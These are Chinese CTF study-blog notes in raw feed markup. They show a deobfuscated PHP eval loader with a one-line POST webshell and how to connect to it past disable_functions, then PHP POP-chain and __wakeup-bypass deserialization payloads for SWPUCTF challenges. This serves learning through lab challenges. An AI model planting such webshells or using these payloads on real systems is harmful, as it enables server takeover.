class="hljs-number">36</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">29</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">26</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">30</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">32</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">35</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">26</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">30</span>&#125;;<br><span class="hljs-comment">//eval($YwzIst(&quot;JHVXY2RhQT0iZVFPTGxDbVRZaFZKVW5SQW9iUFN2anJGeldaeWNIWGZkYXVrcUdnd05wdElCS2lEc3hNRXpxQlprT3V3VWFUS0ZYUmZMZ212Y2hiaXBZZE55QUdzSVdWRVFueGpEUG9IU3RDTUpyZWxtTTlqV0FmeHFuVDJVWWpMS2k5cXcxREZZTkloZ1lSc0RoVVZCd0VYR3ZFN0hNOCtPeD09IjtldmFsKCc/PicuJFl3eklzdCgkT3hpcmhLKCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVKjIpLCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVLCRyVmtLalUpLCRZcEFVV0MoJHVXY2RhQSwwLCRyVmtLalUpKSkpOw==&quot;));</span><br><span class="hljs-variable">$uWcdaA</span>=<span class="hljs-string">&quot;eQOLlCmTYhVJUnRAobPSvjrFzWZycHXfdaukqGgwNptIBKiDsxMEzqBZkOuwUaTKFXRfLgmvchbipYdNyAGsIWVEQnxjDPoHStCMJrelmM9jWAfxqnT2UYjLKi9qw1DFYNIhgYRsDhUVBwEXGvE7HM8+Ox==&quot;</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;?&gt;&#x27;</span>.<span class="hljs-variable">$YwzIst</span>(<span class="hljs-variable">$OxirhK</span>(<span class="hljs-variable">$YpAUWC</span>(<span class="hljs-variable">$uWcdaA</span>,<span class="hljs-variable">$rVkKjU</span>*<span class="hljs-number">2</span>),<span class="hljs-variable">$YpAUWC</span>(<span class="hljs-variable">$uWcdaA</span>,<span class="hljs-variable">$rVkKjU</span>,<span class="hljs-variable">$rVkKjU</span>),<span class="hljs-variable">$YpAUWC</span>(<span class="hljs-variable">$uWcdaA</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$rVkKjU</span>))));<br><span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;?&gt;&#x27;</span>.<span class="hljs-variable">$YwzIst</span>(<span class="hljs-variable">$OxirhK</span>(<span class="hljs-variable">$YpAUWC</span>(<span class="hljs-variable">$uWcdaA</span>,<span class="hljs-variable">$rVkKjU</span>*<span class="hljs-number">2</span>),<span class="hljs-variable">$YpAUWC</span>(<span class="hljs-variable">$uWcdaA</span>,<span class="hljs-variable">$rVkKjU</span>,<span class="hljs-variable">$rVkKjU</span>),<span class="hljs-variable">$YpAUWC</span>(<span class="hljs-variable">$uWcdaA</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$rVkKjU</span>))));<br></code></pre></td></tr></table></figure><p>其中一些变量扔厨子也煮不出来，看佬们wp也是不动它们，<br>重要是不知道要echo的东西大佬们是怎么知道的，又去找一大堆wp，好像都是默认知道要echo啥一样，最后自己仔细看了一遍发现就是把base解码出来的eval里的内容echo出来😫。。。   </p><p><strong>即使蠢如猪豚我也要在ctf走下去口牙！我就是这样的哈基尸啊</strong>  </p><p>最后运行结果好像输出一大串css还是html的东西，但是最后有一句话木马，get到密码了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;/code&gt;<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd_66.99&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>最后是连木马，但是注意要用蚁剑的UserFilter插件，这个是针对php7版本的绕过插件<br><a href="https://hcnote.cn/2024/12/25/12056.html">https://hcnote.cn/2024/12/25/12056.html</a><br>也可以用其它插件来绕过disable_fuction<br><a href="https://www.cnblogs.com/DumpInfou/p/18023278">https://www.cnblogs.com/DumpInfou/p/18023278</a><br><a href="https://ya1orin.github.io/posts/cbe4da55.html">https://ya1orin.github.io/posts/cbe4da55.html</a></p><p>linux下搜索flag字符</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-built_in">find</span> / -<span class="hljs-built_in">name</span> <span class="hljs-built_in">flag</span> -<span class="hljs-built_in">type</span> f <span class="hljs-number">2</span>&gt;/dev/null<br><br>grep -rvh ‘<span class="hljs-built_in">flag</span>’<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>review</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>note-反序列化-01</title>
    <link href="/2025/03/19/note-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/"/>
    <url>/2025/03/19/note-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/</url>
    
    <content type="html"><![CDATA[<p>pop链，我也不知道是什么</p><blockquote><p>POP链就是利用魔法方法在里面进行多次跳转然后获取敏感数据的一种payload，实战应用范围暂时没遇到，不过在CTF比赛中经常出现这样的题目，同时也经常与反序列化一起考察，可以理解为是反序列化的一种拓展，泛用性更强，涉及到的魔法方法也更多。  </p></blockquote><h1 id="SWPUCTF-2021-新生赛-pop"><a href="#SWPUCTF-2021-新生赛-pop" class="headerlink" title="[SWPUCTF 2021 新生赛]pop"></a>[SWPUCTF 2021 新生赛]pop</h1><p>我想tag可以有：pop链，反序列化<br>原题：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;index.php&quot;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w44m</span></span>&#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$admin</span> = <span class="hljs-string">&#x27;aaa&#x27;</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$passwd</span> = <span class="hljs-string">&#x27;123456&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Getflag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;admin === <span class="hljs-string">&#x27;w44m&#x27;</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;passwd ===<span class="hljs-string">&#x27;08067&#x27;</span>)&#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;admin;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;passwd;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nono&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w22m</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w00m</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;w00m;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w33m</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w00m</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w22m</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;w00m-&gt;&#123;<span class="hljs-variable language_">$this</span>-&gt;w22m&#125;();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$w00m</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;w00m&#x27;</span>];<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$w00m</span>);<br></code></pre></td></tr></table></figure><p>学了大佬的wp <a href="https://blog.csdn.net/u010723806/article/details/142340216">https://blog.csdn.net/u010723806/article/details/142340216</a><br>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w44m</span></span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$admin</span> = <span class="hljs-string">&#x27;w44m&#x27;</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$passwd</span> = <span class="hljs-string">&#x27;08067&#x27;</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w22m</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w00m</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w33m</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w00m</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w22m</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">w22m</span>();<br><span class="hljs-variable">$a</span>-&gt;w00m=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">w33m</span>();<br><span class="hljs-variable">$a</span>-&gt;w00m-&gt;w00m=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">w44m</span>();<br><span class="hljs-variable">$a</span>-&gt;w00m-&gt;w22m=<span class="hljs-string">&#x27;Getflag&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>看完后应该是因为只能传w00m的值，而w44m中无法直接传入，要通过一场串相互关联的类才能传入，这大概就是pop链吧  </p><p>先是 w22m 和 w33m 都能传入w00m，</p><blockquote><p>$this-&gt;w00m-&gt;{$this-&gt;w22m}(); 最终的效果是动态调用 $this-&gt;w00m 对象中的一个方法，方法的名称由 $this-&gt;w22m 决定。而 这条语句的意思就是调用了在w33m里的w00m属性（这里是w00m类）中的w22m方法。</p></blockquote><h2 id="为什么先赋值-w22m"><a href="#为什么先赋值-w22m" class="headerlink" title="为什么先赋值 w22m  "></a><strong>为什么先赋值 w22m</strong>  </h2><p><strong>利用 w22m 的 __destruct 方法：</strong><br>w22m 类的 __destruct 方法会输出 $this-&gt;w00m。<br>当 PHP 脚本结束时，或者当对象被销毁时，__destruct 方法会被自动调用。<br>这意味着，当我们反序列化一个 w22m 对象时，__destruct 方法会立即执行，从而触发后续的操作。  </p><p><strong>触发 w33m 的 __toString 方法：</strong><br>w22m 的 __destruct 方法输出 $this-&gt;w00m，而 $this-&gt;w00m 是一个 w33m 对象。<br>当 PHP 需要将一个对象转换为字符串时（例如在 echo 中），会自动调用该对象的 __toString 方法。<br>因此，w33m 的 __toString 方法会被调用。    </p><p><strong>调用 w44m 的 Getflag 方法：</strong><br>w33m 的 __toString 方法中，$this-&gt;w00m-&gt;{$this-&gt;w22m}() 会被执行。<br>这里的 $this-&gt;w00m 是一个 w44m 对象，而 $this-&gt;w22m 是字符串 ‘Getflag’。<br>因此，w44m 的 Getflag 方法会被调用。  </p><h2 id="我的理解是：整个构造的最终目的是为了执行-w44m-类中的-Getflag-方法"><a href="#我的理解是：整个构造的最终目的是为了执行-w44m-类中的-Getflag-方法" class="headerlink" title="我的理解是：整个构造的最终目的是为了执行 w44m 类中的 Getflag 方法  "></a>我的理解是：整个构造的最终目的是为了执行 w44m 类中的 Getflag 方法  </h2><blockquote><p>对于__toString()，要求是在它类里的变量被实例化时才会被触发。所以$p-&gt;w00m &#x3D; new w33m();则不会触发__toString()。而后面$a-&gt;w00m-&gt;w00m&#x3D;new w44m();语句为w33m类中的变量实例化后，才能使_toString()方法可被调用，进一步让$a-&gt;w00m-&gt;w22m&#x3D;’Getflag’;语句生效。</p></blockquote><blockquote><p>当我们传递的参数中含有private变量时，一定要url编码一下，否则会有不可见字符导致解析出错。</p></blockquote><p>这是我猜测后端代码接收到传入后的样子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w22m</span></span>&#123;<br>    <span class="hljs-keyword">public</span> (w00m)<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w33m</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> (<span class="hljs-title">w00m</span>)<span class="hljs-title">w44m</span></span>&#123;<br><br>            <span class="hljs-keyword">private</span> <span class="hljs-variable">$admin</span> = <span class="hljs-string">&#x27;w44m&#x27;</span>;<br>            <span class="hljs-keyword">protected</span> <span class="hljs-variable">$passwd</span> = <span class="hljs-string">&#x27;08067&#x27;</span>;<br>        <br>            <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Getflag</span>(<span class="hljs-params"></span>)</span>&#123;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;admin === <span class="hljs-string">&#x27;w44m&#x27;</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;passwd ===<span class="hljs-string">&#x27;08067&#x27;</span>)&#123;<br>                    <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;admin;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;passwd;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nono&#x27;</span>;<br>        <span class="hljs-keyword">public</span> (w22m)<span class="hljs-string">&#x27;Getflag&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;w00m-&gt;&#123;<span class="hljs-variable language_">$this</span>-&gt;w22m&#125;();<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;w00m;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p><br><br><br>\</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">$<span class="hljs-function"><span class="hljs-title">this</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">w00m</span>-&gt;</span>&#123;$<span class="hljs-function"><span class="hljs-title">this</span>-&gt;</span>w22m&#125;();<br></code></pre></td></tr></table></figure><p>q:  </p><blockquote><p>的意思是让将w22m的值作为参数输入w00m吗</p></blockquote><p>kimi:</p><blockquote><p>不是的,例如，如果 $this-&gt;w22m 的值是 ‘Getflag’，那么这行代码就相当于 $this-&gt;w00m-&gt;Getflag()。 </p></blockquote><p>q:</p><blockquote><p>那就是执行w00m中的getflag()？</p></blockquote><p>kimi:</p><blockquote><p>是的，这行代码的意思是执行 $this-&gt;w00m 对象中的 Getflag() 方法</p></blockquote><h2 id="那么我看总的意思是："><a href="#那么我看总的意思是：" class="headerlink" title="那么我看总的意思是："></a>那么我看总的意思是：</h2><p>将w22m中的w00m赋值为w33m的类<br>再将w22m中w00m（现已为w33m类）的w00m赋值为w44m的类<br>最后将w22m中的w00m（现已为w33m类）中的w22m赋值为‘GetFlag’<br>最后由于__toString()函数，会将改类下的w22m的值作为w44m中的的元素执行，那结果就是执行w44m中的Getflag<br>输出flag</p><p>wp作者：</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xl">$a=new w22m();<span class="hljs-comment">//这段代码说明我们将w22m类赋值给a，现在可以将$a看做w22m类,所以现在$a中有一个属性w00m</span><br><br>$<span class="hljs-function"><span class="hljs-title">a</span>-&gt;</span>w00m=new w33m();<span class="hljs-comment">//将w22m中的w00m属性调用（指向）w33m类：现在w22m中w00m属性有w33类中w00m和w22m两个属性。</span><br><br>$<span class="hljs-function"><span class="hljs-title">a</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">w00m</span>-&gt;</span>w00m=new w44m();<span class="hljs-comment">//w22m类中w00m属性调用了w44m类</span><br><br>$<span class="hljs-function"><span class="hljs-title">a</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">w00m</span>-&gt;</span>w22m=<span class="hljs-string">&#x27;Getflag&#x27;</span>;<span class="hljs-comment">//使用了w44m类中的Getflag方法，()在w33m中_toString()方法被调用。</span><br>最后的效果就是在w44m中执行了Getflag()整个方法，输出了$flag的值。<br></code></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/u010723806/article/details/142340216">https://blog.csdn.net/u010723806/article/details/142340216</a></p><p>最后payload</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;w22m&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;w00m&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;w33m&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;w00m&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;w44m&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;w44madmin&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;w44m&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;*passwd&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;08067&quot;</span>;&#125;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;w22m&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;Getflag&quot;</span>;&#125;&#125;<br></code></pre></td></tr></table></figure><p>传入要型url编码，</p><blockquote><p>当我们传递的参数中含有private变量时，一定要url编码一下，否则会有不可见字符导致解析出错</p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>note-反序列化-00</title>
    <link href="/2025/03/18/note-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-00/"/>
    <url>/2025/03/18/note-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-00/</url>
    
    <content type="html"><![CDATA[<h1 id="java反序列化notice"><a href="#java反序列化notice" class="headerlink" title="java反序列化notice"></a>java反序列化notice</h1><p>现在理解的反序列大概就是传入一串字符，经java的处理变成能执行的语句，实现rec  </p><blockquote><p>序列化指的是将对象或数据结构转换为可存储或传输的格式的过程，实现的方法是writeObject()；反序列化则反之，实现的方法是readObject()，可以简单地理解为将文件压缩和解压缩的过程。</p></blockquote><blockquote><p>与PHP中反序列互相触发魔法函数导致的漏洞成因不同，java反序列化漏洞的成因主要是由于java序列化和反序列化机制的设计特点所致，简单地讲，只要反序列化代码中含有危险的命令代码，且该代码的参数是可控的，那它就存在该漏洞。</p></blockquote><blockquote><p>漏洞原理在我今天这里不是重要的，我主要想记录的是该漏洞的利用方式。</p></blockquote><blockquote><p>通常在解题中如果你看到一段字符串以rO0AB开头，那它是java序列化后base64编码的数据；如果一段字符串以aced开头，那它是java序列化后十六进制的数据，碰到这两种情况都基本可以认定该题考点为java反序列化漏洞，如果有直接接受该字符串的输入点，就可以尝试用链子直接打。</p></blockquote><blockquote><p>原文链接：<a href="https://blog.csdn.net/m0_64893612/article/details/136378608">https://blog.csdn.net/m0_64893612/article/details/136378608</a></p></blockquote><h2 id="SWPUCTF-2021-新生赛-no-wakeup-学习笔记："><a href="#SWPUCTF-2021-新生赛-no-wakeup-学习笔记：" class="headerlink" title="[SWPUCTF 2021 新生赛]no_wakeup 学习笔记："></a>[SWPUCTF 2021 新生赛]no_wakeup 学习笔记：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;class.php&quot;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HaHaHa</span></span>&#123;<br><br><br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$admin</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$passwd</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;admin =<span class="hljs-string">&quot;user&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;passwd = <span class="hljs-string">&quot;123456&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;passwd = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;passwd);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;admin === <span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;passwd === <span class="hljs-string">&quot;wllm&quot;</span>)&#123;<br>                <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;passwd;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;No wake up&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br><span class="hljs-variable">$Letmeseesee</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>];<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$Letmeseesee</span>);<br>```  <br>  <br></code></pre></td></tr></table></figure><p>大概是get一个p参数，传给$Letmeseesee然后反序列化，可能p经过反序列化后会变成一个名为this的变量，里面包含有{admin,passwd},其中passwd经过sha1计算再赋值给原来的passwd，当this里的admin&#x3D;&#x3D;&#x3D;admin，经过sha1计算的passwd&#x3D;&#x3D;&#x3D;wllm时就会输出flag</p><p>KIMI：</p><blockquote><p>你的审计思路基本正确，但有一些细节需要澄清：<br>反序列化后的对象状态：<br>当用户传入的p参数被反序列化后，如果它是一个HaHaHa类的对象，那么__wakeup()方法会被调用，此时$passwd的值会被更新为sha1($passwd)。<br>因此，$passwd的值在反序列化后会被哈希处理，而不是直接使用传入的值。<br>条件判断：<br>在析构方法中，判断条件是$admin &#x3D;&#x3D;&#x3D; “admin”且$passwd &#x3D;&#x3D;&#x3D; “wllm”。<br>因此，攻击者需要构造一个对象，使得反序列化后$admin为”admin”，并且$passwd在经过sha1()哈希后等于”wllm”。  </p></blockquote><p>然而怎么可能会有在经过sha1处理后的到wllm的值。<br>所以要绕过这个__wakeup()</p><p><strong>__wakeup() 的作用</strong><br>反序列化时的初始化：<br>当一个对象被序列化后，其状态会被保存为字符串。在反序列化时，对象的状态会被恢复，但某些资源（如数据库连接）可能无法直接序列化，因此需要在反序列化后重新初始化这些资源。<br>__wakeup() 方法正是为此设计的，它允许你在对象恢复后执行一些必要的操作。<br>数据处理：<br>在反序列化后，你可能需要对对象的某些属性进行处理。例如，对敏感数据进行解密，或者对某些属性进行格式转换。</p><p>所以大概就是当触发反序列化时__wakeup就会调用这个sha1.</p><p>网上正确的payload：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">?p=O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;HaHaHa&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;passwd&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;wllm&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>学习notice：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>：表示这是一个对象（Object）。  <br><span class="hljs-attribute">O</span>:<span class="hljs-number">6</span>:<span 